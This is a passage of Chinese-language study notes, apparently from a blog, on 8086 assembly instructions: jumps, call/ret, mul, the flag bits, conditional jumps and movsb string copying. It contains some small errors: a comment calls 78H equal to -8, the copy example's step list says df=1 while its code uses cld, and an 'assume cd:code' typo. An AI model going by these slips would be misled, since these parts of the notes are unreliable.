class="line">s0:nop;nop机器码占一个字节</span><br><span class="line">nop</span><br><span class="line">codesg ends</span><br><span class="line">end s</span><br></pre></td></tr></table></figure><h2 id="9-2-jmp指令"><a href="#9-2-jmp指令" class="headerlink" title="9.2 jmp指令"></a>9.2 jmp指令</h2><p>jmp为无条件转移指令，可以指修改IP，也可以同时修改CS和IP。</p><p>jmp指令要给出两种信息：</p><ol><li>转移的目的地址</li><li>转移的距离(段间转移、段内短转移、段内近转移)</li></ol><h3 id="9-2-1-依据位移进行转移的jmp指令"><a href="#9-2-1-依据位移进行转移的jmp指令" class="headerlink" title="9.2.1 依据位移进行转移的jmp指令"></a>9.2.1 依据位移进行转移的jmp指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short 标号(转到标号处执行指令)：(IP)=(IP)+8位位移</span><br></pre></td></tr></table></figure><p>这种格式的jmp指令实现的是段内短转移，它对IP的修改范围为-128~127，向前转移时最多可以越过128个字节，向后转移最多可以越过127个字节。</p><p>CPU在执行jmp指令的时候并不需要转移的目的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,0</span><br><span class="line">jmp short s</span><br><span class="line">add ax,1</span><br><span class="line">s:inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp near ptr 标号：(IP)=(IP)+16位位移</span><br></pre></td></tr></table></figure><p>这种格式的jmp指令实现的是段内近转移，它对IP的修改范围为-32768~32767，向前转移时最多可以越过32768个字节，向后转移最多可以越过32767个字节。</p><h3 id="9-2-2-转移的目的地址在指令中的jmp指令"><a href="#9-2-2-转移的目的地址在指令中的jmp指令" class="headerlink" title="9.2.2 转移的目的地址在指令中的jmp指令"></a>9.2.2 转移的目的地址在指令中的jmp指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp far ptr 标号：(CS)=标号所在段的段地址；(IP)=标号在段中的偏移地址</span><br></pre></td></tr></table></figure><p>这种格式的jmp指令实现的是段间转移，又称远转移。far ptr指明了指令用标号的段地址和偏移地址修改CS和IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,0</span><br><span class="line">mov bx,0</span><br><span class="line">jmp far ptr s</span><br><span class="line">db 256 dup (0)</span><br><span class="line">s:add ax,1</span><br><span class="line">inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h3 id="9-2-3-转移地址在寄存器中的-jmp指令"><a href="#9-2-3-转移地址在寄存器中的-jmp指令" class="headerlink" title="9.2.3 转移地址在寄存器中的 jmp指令"></a>9.2.3 转移地址在寄存器中的 jmp指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 16位reg：(IP)=(16位reg)</span><br></pre></td></tr></table></figure><h3 id="9-2-4-转移地址在内存中的jmp指令"><a href="#9-2-4-转移地址在内存中的jmp指令" class="headerlink" title="9.2.4 转移地址在内存中的jmp指令"></a>9.2.4 转移地址在内存中的jmp指令</h3><p>转移地址在内存中的jmp指令有两种格式：</p><ol><li>jmp word ptr 内存单元地址(段内转移)</li></ol><p>功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(IP)=0123H</p><ol><li>jmp dword ptr 内存单元地址(段间转移)</li></ol><p>功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址。</p><p>(CS)=(内存单元地址+2)，(IP)=(内存单元地址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(CS)=0，(IP)=0123h，CS:IP指向0000:0123</p><h2 id="9-3-jcxz指令"><a href="#9-3-jcxz指令" class="headerlink" title="9.3 jcxz指令"></a>9.3 jcxz指令</h2><p>jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jcxz 标号(如果(cx)=0,转移到标号处执行)：当(cx)=0时，(IP)=(IP)+8位位移</span><br><span class="line">if((cx)==0) jmp short 标号;</span><br></pre></td></tr></table></figure><h2 id="9-4-loop指令"><a href="#9-4-loop指令" class="headerlink" title="9.4 loop指令"></a>9.4 loop指令</h2><p>loop指令是循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop 标号((cx)=(cx)-1,如果(cx)≠0，转移到标号处执行)：如果(cx)≠0,(IP)=(IP)+8位位移</span><br><span class="line">(cx)--;</span><br><span class="line">if((cx)!=0) jmp short 标号;</span><br></pre></td></tr></table></figure><h1 id="10-call和ret指令"><a href="#10-call和ret指令" class="headerlink" title="10. call和ret指令"></a>10. call和ret指令</h1><p>call和ret指令都是转移指令，他们都修改IP，或同时修改CS和IP。它们经常被共同用来实现子程序的设计。</p><h2 id="10-1-ret和retf"><a href="#10-1-ret和retf" class="headerlink" title="10.1 ret和retf"></a>10.1 ret和retf</h2><p>ret指令用栈中的数据，修改IP的内容，从而实现近转移；retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。</p><h3 id="10-1-1-ret指令"><a href="#10-1-1-ret指令" class="headerlink" title="10.1.1 ret指令"></a>10.1.1 ret指令</h3><p>CPU执行ret指令时，进行下面2步操作：</p><ol><li>(IP)=((SS)*16+(SP))</li><li>(SP)=(SP)+2</li></ol><p>CPU执行ret指令时相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br></pre></td></tr></table></figure><h3 id="10-1-2-retf指令"><a href="#10-1-2-retf指令" class="headerlink" title="10.1.2 retf指令"></a>10.1.2 retf指令</h3><p>CPU执行retf指令时，进行下面4步操作：</p><ol><li>(IP)=((SS)*16+(SP))</li><li>(SP)=(SP)+2</li><li>(CS)=((SS)*16+(SP))</li><li>(SP)=(SP)+2</li></ol><p>CPU执行retf指令时相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br></pre></td></tr></table></figure><h2 id="10-2-call指令"><a href="#10-2-call指令" class="headerlink" title="10.2 call指令"></a>10.2 call指令</h2><p>CPU执行call指令时，进行2步操作：</p><ol><li>将当前的IP或CS和IP压入栈中</li><li>转移</li></ol><p>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。</p><h3 id="10-2-1-依据位移进行转移的call指令"><a href="#10-2-1-依据位移进行转移的call指令" class="headerlink" title="10.2.1 依据位移进行转移的call指令"></a>10.2.1 依据位移进行转移的call指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 标号(将当前的IP压栈后，转到标号处执行指令)</span><br></pre></td></tr></table></figure><p>CPU执行此种格式的call指令时，进行如下操作：</p><ol><li>(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)</li><li>(IP)=(IP)+16位位移</li></ol><p>CPU执行“call 标号“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure><h3 id="10-2-2-转移的目的地址在指令中的call指令"><a href="#10-2-2-转移的目的地址在指令中的call指令" class="headerlink" title="10.2.2 转移的目的地址在指令中的call指令"></a>10.2.2 转移的目的地址在指令中的call指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call far ptr 标号</span><br></pre></td></tr></table></figure><p>实现的是段间转移。</p><p>CPU执行此种格式的call指令时，进行如下操作：</p><ol><li><p>(sp)=(sp)-2</p><p>((ss)*16+(sp))=(CS)</p><p>(sp)=(sp)-2</p><p>((ss)*16+(sp))=(IP)</p></li><li><p>(CS)=标号所在段的段地址</p><p>(IP)=标号在段中的偏移地址</p></li></ol><p>CPU执行“call far ptr 标号“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure><h3 id="10-2-3-转移地址在寄存器中的call指令"><a href="#10-2-3-转移地址在寄存器中的call指令" class="headerlink" title="10.2.3 转移地址在寄存器中的call指令"></a>10.2.3 转移地址在寄存器中的call指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 16位reg</span><br></pre></td></tr></table></figure><p>CPU执行此种格式的call指令时，进行如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(IP)</span><br><span class="line">(IP)=(16位reg)</span><br></pre></td></tr></table></figure><p>CPU执行“call 16位reg“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp 16位reg</span><br></pre></td></tr></table></figure><h3 id="10-2-4-转移地址在内存中的call指令"><a href="#10-2-4-转移地址在内存中的call指令" class="headerlink" title="10.2.4 转移地址在内存中的call指令"></a>10.2.4 转移地址在内存中的call指令</h3><p>转移地址在内存中的call指令有两种格式：</p><ol><li>call word ptr 内存单元地址</li></ol><p>CPU执行“call word ptr 内存单元地址“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">call word ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(IP)=0123h，(sp)=0EH</p><ol><li>call dword ptr 内存单元地址</li></ol><p>CPU执行“call dword ptr 内存单元地址“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">call dword ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(CS)=0，(IP)=0123H，(sp)=0CH</p><h2 id="10-3-call和ret的配合使用"><a href="#10-3-call和ret的配合使用" class="headerlink" title="10.3 call和ret的配合使用"></a>10.3 call和ret的配合使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">assume cd:code</span><br><span class="line">code segment</span><br><span class="line">start:mov ax,1</span><br><span class="line">mov cx,3</span><br><span class="line">call s</span><br><span class="line">mov bx,ax;(bx)=8</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br><span class="line">ret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="10-4-mul指令"><a href="#10-4-mul指令" class="headerlink" title="10.4 mul指令"></a>10.4 mul指令</h2><p>mul指令是乘法指令，使用mul做乘法时要注意两点：</p><ol><li>两个相乘的数：要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认放在AX中，另一个放在16位reg或内存字单元中</li><li>结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认在DX中存放，低位在AX中存放</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mul reg</span><br><span class="line">mul 内存单元</span><br><span class="line"></span><br><span class="line">mul byte ptr ds:[0]</span><br><span class="line">含义：(ax)=(al)*((ds)*16+0)</span><br><span class="line"></span><br><span class="line">mul word ptr [bx+si+8]</span><br><span class="line">含义：(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位</span><br><span class="line"> (dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位</span><br></pre></td></tr></table></figure><p>计算100*10。(100和10小于255，可以做8位乘法)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,100</span><br><span class="line">mov bl,10</span><br><span class="line">mul bl</span><br></pre></td></tr></table></figure><p>结果：(ax)=1000(03E8H)</p><p>计算100*10000。(100小于255，但10000大于255，所以必须做16位乘法)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,100</span><br><span class="line">mov bx,10000</span><br><span class="line">mul bx</span><br></pre></td></tr></table></figure><p>结果：(ax)=4240h，(dx)=000FH（F4240H=1000000）</p><h1 id="11-标志寄存器"><a href="#11-标志寄存器" class="headerlink" title="11. 标志寄存器"></a>11. 标志寄存器</h1><p>标志寄存器作用：</p><ol><li>用来存储相关指令的某些执行结果</li><li>用来为CPU执行相关指令提供行为依据</li><li>用来控制CPU的相关工作方式</li></ol><p>flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息。</p><div class="table-container"><table><thead><tr><th>15</th><th>14</th><th>13</th><th>12</th><th>11</th><th>10</th><th>9</th><th>8</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td>OF</td><td>DF</td><td>IF</td><td>TF</td><td>SF</td><td>ZF</td><td></td><td>AF</td><td></td><td>PF</td><td></td><td>CF</td></tr></tbody></table></div><p>8086中flag寄存器只有标注的这些位有特殊的含义，其它8086CPU没有使用。</p><h2 id="11-1-ZF标志"><a href="#11-1-ZF标志" class="headerlink" title="11.1 ZF标志"></a>11.1 ZF标志</h2><p>flag的第6位是ZF，零标志位。它记录相关指令执行后，其结果是否为0。如果为0，ZF=1；否则ZF=0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure><p>执行后，(ax)=0，ZF=1</p><h2 id="11-2-PF标志"><a href="#11-2-PF标志" class="headerlink" title="11.2 PF标志"></a>11.2 PF标志</h2><p>flag的第2位是PF，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。如果1的个数为偶数，PF=1；否则PF=0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">add al,10</span><br></pre></td></tr></table></figure><p>执行后，结果为11=00001011B，其中有3个1，PF=0</p><h2 id="11-3-SF标志"><a href="#11-3-SF标志" class="headerlink" title="11.3 SF标志"></a>11.3 SF标志</h2><p>flag的第7位是SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果结果为负，SF=1；否则SF=0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001B;al=-127</span><br><span class="line">add al,1</span><br></pre></td></tr></table></figure><p>结果：(al)=10000010B，SF=1</p><h2 id="11-4-CF标志"><a href="#11-4-CF标志" class="headerlink" title="11.4 CF标志"></a>11.4 CF标志</h2><p>flag的第0位是CF，进位标志位。一般情况下，在进行<strong>无符号数运算</strong>时，它记录了运算结果的最高有效位向更高位的进位值，或从更高位借位。</p><div class="table-container"><table><thead><tr><th></th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td></td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td></tr><tr><td>假想的更高位</td><td>最高有效位</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table></div><p>当两数相加时，有可能产生从最高有效位向更高位的进位。CPU在运算的时候，并不丢弃这个进位值，而是记录在一个特殊的寄存器的某一位上。8086CPU就用flag的CF位来记录这个进位值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,98H</span><br><span class="line">add al,al;98h+98h=130h=0001 0011 0000B</span><br></pre></td></tr></table></figure><p>执行后，(al)=30H，CF=1，CF记录了从最高有效位向更高位的进位值。</p><h2 id="11-5-OF标志"><a href="#11-5-OF标志" class="headerlink" title="11.5 OF标志"></a>11.5 OF标志</h2><p>flag的第11位是OF，溢出标志位。一般情况下，OF记录了<strong>有符号数运算</strong>的结果是否发生了溢出。如果发生溢出，OF=1；否则OF=0。</p><p>对于8位的有符号数据，机器所能表示的范围就是-128~127；对于16位的有符号数据，机器所能表示的范围是-32768~32767。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,0F0H;0f0h=240=-16240-128*2=-16</span><br><span class="line">add al,78H;78h=120=-8</span><br></pre></td></tr></table></figure><p>执行后，对于无符号运算，0F0H+78H=168H=0001 0110 1000B，CF=1；对于有符号数，-16-8=-24，OF=0。</p><h2 id="11-6-adc指令"><a href="#11-6-adc指令" class="headerlink" title="11.6 adc指令"></a>11.6 adc指令</h2><p>adc是带进位加法指令，它利用了CF位上记录的进位值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc 操作对象1,操作对象2</span><br></pre></td></tr></table></figure><p>操作对象1=操作对象1+操作对象2+CF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2;(ax)=2</span><br><span class="line">mov bx,1;(bx)=1</span><br><span class="line">sub bx,ax;(bx)=-1=FFFFHCF=1</span><br><span class="line">adc ax,1;(ax)=(ax)+1+CF=4</span><br></pre></td></tr></table></figure><h2 id="11-7-sbb指令"><a href="#11-7-sbb指令" class="headerlink" title="11.7 sbb指令"></a>11.7 sbb指令</h2><p>sbb是带借位减法指令，它利用了CF位上记录的借位值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbb 操作对象1,操作对象2</span><br></pre></td></tr></table></figure><p>操作对象1=操作对象1-操作对象2-CF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H;(bx)=1000h</span><br><span class="line">mov ax,003EH;(ax)=003eh</span><br><span class="line">sub bx,2000H;(bx)=1000h-2000h=F000HCF=1</span><br><span class="line">sbb ax,0020H;(ax)=(ax)-20h-1=1D</span><br></pre></td></tr></table></figure><h2 id="11-8-cmp指令"><a href="#11-8-cmp指令" class="headerlink" title="11.8 cmp指令"></a>11.8 cmp指令</h2><p>cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp 操作对象1,操作对象2</span><br></pre></td></tr></table></figure><p>计算操作对象1-操作对象2但并不保存结果，仅仅根据计算结果对标志寄存器进行设置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,8;(ax)=8</span><br><span class="line">mov bx,3;(bx)=3</span><br><span class="line">cmp ax,bx;(ax)-(bx)=5=0101b</span><br></pre></td></tr></table></figure><p>指令执行后，零标志位ZF=0，奇偶标志位PF=1，符号标志位SF=0，进位标志位CF=0，溢出标志位OF=0</p><p>如果因为溢出导致了实际结果为负，那么逻辑上真正的结果必然为正；反之亦然。</p><h2 id="11-9-检测比较结果的条件转移指令"><a href="#11-9-检测比较结果的条件转移指令" class="headerlink" title="11.9 检测比较结果的条件转移指令"></a>11.9 检测比较结果的条件转移指令</h2><p>除了jcxz指令外，CPU还提供了其他条件转移指令，大多数条件转移指令都检测标志寄存器的相关标志位，根据检测结果来决定是否修改IP。这些条件转移指令通常和cmp相配合使用，类似call和ret配合。</p><p>因为cmp指令可以同时进行两种比较，无符号数比较和有符号数比较，所以根据cmp指令的比较结果进行转移的指令也分为两种，即根据无符号数的比较结果进行转移的条件转移指令(它们检测ZF、CF的值)和根据有符号数的比较结果进行转移的条件转移指令(SF、OF、ZF)。</p><p>常用的根据无符号数的比较结果进行转移的条件转移指令</p><div class="table-container"><table><thead><tr><th>指令</th><th>全称</th><th>含义</th><th>检测的相关标志位</th></tr></thead><tbody><tr><td>je</td><td>jump equal</td><td>等于则转移</td><td>zf=1</td></tr><tr><td>jne</td><td>jump not equal</td><td>不等于则转移</td><td>zf=0</td></tr><tr><td>jb</td><td>jump below</td><td>低于则转移</td><td>cf=1</td></tr><tr><td>jnb</td><td>jmp not below</td><td>不低于则转移</td><td>cf=0</td></tr><tr><td>ja</td><td>jump above</td><td>高于则转移</td><td>cf=0且zf=0</td></tr><tr><td>jna</td><td>jump not above</td><td>不高于则转移</td><td>cf=1或zf=1</td></tr><tr><td>jz</td><td>jump zero</td><td>零则转移</td><td>zf=1</td></tr><tr><td>jnz</td><td>jump not zero</td><td>非零则转移</td><td>zf=0</td></tr></tbody></table></div><p>编程统计data段中数值为8的字节的个数，用ax保存统计结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">db 8,11,8,1,8,5,63,38</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0;ds:bx指向第一个字节</span><br><span class="line">mov ax,0;初始化累加器</span><br><span class="line">mov cx,8</span><br><span class="line">s:cmp byte ptr [bx],8;和8进行比较</span><br><span class="line">jne next;如果不相等则转到next，继续循环</span><br><span class="line">inc ax;如果相等将计数加1</span><br><span class="line">next:inc bx</span><br><span class="line">loop s;程序执行后(ax)=3</span><br><span class="line">code ends</span><br></pre></td></tr></table></figure><h2 id="11-10-DF标志和串传送指令"><a href="#11-10-DF标志和串传送指令" class="headerlink" title="11.10 DF标志和串传送指令"></a>11.10 DF标志和串传送指令</h2><p>flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si、di的增减。</p><p>df=0    每次操作后si、di递增；</p><p>df=1    每次操作后si、di递减。</p><h3 id="11-10-1-串传送指令"><a href="#11-10-1-串传送指令" class="headerlink" title="11.10.1 串传送指令"></a>11.10.1 串传送指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsb</span><br></pre></td></tr></table></figure><p>执行movsb指令相当于进行下面操作：</p><ol><li><p>((es)<em>16+(di))=((ds)\</em>16+(si))</p></li><li><p>如果df=0则 (si)=(si)+1;(di)=(di)+1</p><p>如果df=1则 (si)=(si)-1;(di)=(di)-1</p></li></ol><p>movsb的功能是将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器df的值，将si和递增或递减。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsw</span><br></pre></td></tr></table></figure><p>movsw的功能是将ds:si指向的内存字单元中的字送入es:di中，然后根据标志寄存器df的值，将si和递增2或递减2。</p><p>movsb和movsw进行的是串传送操作的一个步骤，一般来说，movsb和movsw都和rep配合使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rep movsb</span><br></pre></td></tr></table></figure><p>用汇编语法来描述就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s:movsb</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>rep的作用是根据cx的值，重复执行后面的串传送指令。由于每执行一次movsb指令si和di都会递增或递减后一个或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送。</p><p>由于df位决定着串传送指令执行后si和di改变的方向，所以CPU应该提供相应的指令来对df位进行设置，从而使人能够决定传送的方向。</p><p>8086CPU提供下面两条指令对df位进行设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cld指令:将标志寄存器的df位置0</span><br><span class="line">std指令:将标志寄存器的df位置1</span><br></pre></td></tr></table></figure><p>编程，用串传送指令，将data段中的第一个字符串复制到它后面的空间中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">db &#x27;Welcome to masm!&#x27;</span><br><span class="line">db 16 dup (0)</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><p>①传送的原始位置：ds:si    data:0</p><p>②传送的目的位置：es:di    data:10h</p><p>③传送的长度：cx                (cx)=16</p><p>④传送的方向：df                df=1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0;ds:si指向data:0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,16;es:di指向data:0010</span><br><span class="line">mov cx,16</span><br><span class="line">cld;df=0,正向传送</span><br><span class="line">rep movsb</span><br></pre></td></tr></table></figure><h2 id="11-11-pushf和popf"><a href="#11-11-pushf和popf" class="headerlink" title="11.11 pushf和popf"></a>11.11 pushf和popf</h2><p>pushf的功能是将标志寄存器的值压栈，popf是从栈中弹出数据，送入标志寄存器中。</p><h1 